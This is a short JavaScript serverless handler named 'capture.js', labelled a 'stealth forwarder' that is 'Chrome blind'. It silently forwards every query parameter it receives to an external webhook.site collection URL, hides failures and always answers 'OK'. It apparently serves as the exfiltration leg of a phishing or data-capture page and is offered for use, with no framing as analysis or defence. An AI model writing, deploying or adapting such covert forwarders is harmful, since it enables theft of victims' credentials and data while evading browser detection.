// /api/capture.js - STEALTH FORWARDER (CHROME BLIND)
export default async function handler(req) {
    try {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const params = url.searchParams.toString();

        // 🔥 FORWARD TO WEBHOOK (invisible to Chrome)
        await fetch(`https://webhook.site/49f71cf9-f98e-4cfa-840b-419ebe5cac4e?${params}`, {
            method: 'GET'
        });

        return new Response('OK', { status: 200 });
    } catch (e) {
        return new Response('OK', { status: 200 }); // Silent fail
    }
}